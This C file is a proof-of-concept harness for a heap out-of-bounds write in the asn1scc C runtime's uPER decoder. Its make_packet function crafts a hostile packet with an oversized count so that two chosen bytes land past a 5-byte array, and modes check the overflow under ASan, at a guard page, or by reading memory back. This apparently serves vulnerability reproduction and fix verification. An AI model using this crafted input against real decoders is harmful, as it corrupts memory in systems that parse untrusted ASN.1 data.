/* Frontier harness for CVE-2026-75614 (asn1scc <= 4.6.0.17 C runtime).
 *
 * The generated uPER decoder comes verbatim from the pinned 4.7.0.1 compiler
 * asset; the runtime C files are the verbatim pinned 4.6.0.17 (vulnerable) or
 * 4.7.0.1 (fixed) sources. No library source is edited by this harness.
 *
 * Modes:
 *   asan      exact-size 9-byte destination, sanitizer reports the store
 *   plain     same destination without ASan (reproducible trigger/state)
 *   readback  staged 32-byte region; print chosen bytes at arr+5 / arr+6
 *   guard     place arr[5] exactly at a PROT_NONE page boundary
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "asn1crt_encoding.h"
#include <sys/mman.h>
#include <unistd.h>
#include "schema.h"

/* A SIZE(0..5) field uses 3 bits (values 0..7). For a hostile count of 7 the
 * first three bits are 111; each following wire byte carries the low 5 bits
 * of one chosen decoded byte and the high 3 bits of the next. Solving those
 * overlaps makes every decoded byte (including the two past-end bytes) exactly
 * the chosen pattern. */
static void make_packet(unsigned char *wire, int count, const unsigned char *chosen)
{
    int i;
    memset(wire, 0, 8);
    wire[0] = (unsigned char)(((count & 7) << 5) | (chosen[0] >> 3));
    for (i = 1; i < count; i++)
        wire[i] = (unsigned char)(((chosen[i-1] & 0x07) << 5) | (chosen[i] >> 3));
    wire[count] = (unsigned char)((chosen[count-1] & 0x07) << 5);
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "asan";
    int count = argc > 2 ? atoi(argv[2]) : 7;
    int pattern = argc > 3 ? atoi(argv[3]) : 0;
    unsigned char chosen[7];
    unsigned char wire[8];
    BitStream bs;

    Payload *p;
    int err = -1, i;
    flag ok;
    volatile unsigned char *rb;

    for (i = 0; i < 7; i++)
        chosen[i] = pattern ? (unsigned char)(i % 2 ? 0x5a : 0xa5)
                            : (unsigned char)(i % 2 ? 0xa5 : 0x5a);
    make_packet(wire, count, chosen);
    if (!strcmp(mode, "rtcheck")) {
        asn1SccSint v = -1;
        flag rt;
        BitStream_AttachBuffer(&bs, wire, (long)sizeof(wire));
        rt = BitStream_DecodeConstraintWholeNumber(&bs, &v, 0, 5);
        printf("rtcheck count_field=%d rt=%d decoded=%lld (range 0..5)\n",
               count, rt, (long long)v);
        return rt ? 1 : 0;
    }

    if (!strcmp(mode, "guard")) {
        long page = sysconf(_SC_PAGESIZE);
        char *base = mmap(NULL, (size_t)page * 2, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (base == MAP_FAILED) return 2;
        if (mprotect(base + page, (size_t)page, PROT_NONE) != 0) return 2;
        /* nCount (4 bytes) + arr[5] ends exactly on the guard page. */
        p = (Payload *)(base + page - 9);
    } else if (!strcmp(mode, "readback")) {
        char *region = malloc(32);
        if (!region) return 2;
        memset(region, 0xcc, 32);
        p = (Payload *)region;
    } else {
        /* Exact 9-byte destination: arr+5 is the first byte after the object,
         * so no struct padding hides the write from ASan. */
        p = (Payload *)malloc(9);
        if (!p) return 2;
    }
    p->nCount = 0;
    memset(p->arr, 0, 5);

    BitStream_AttachBuffer(&bs, wire, (long)sizeof(wire));
    ok = Payload_Decode(p, &bs, &err);
    printf("decode mode=%s count_field=%d pattern=%d ok=%d err=%d decoded=%d\n",
           mode, count, pattern, ok, err, p->nCount);

    if (!strcmp(mode, "readback")) {
        rb = (volatile unsigned char *)p;
        printf("arr=");
        for (i = 0; i < 5; i++) printf("%02x", rb[4 + i]);
        printf(" past");
        for (i = 5; i < 7; i++) printf(" +%d=%02x", i, rb[4 + i]);
        printf(" expected=");
        for (i = 0; i < 7; i++) printf("%02x", chosen[i]);
        printf("\n");
    }
    return ok ? 0 : 1;
}
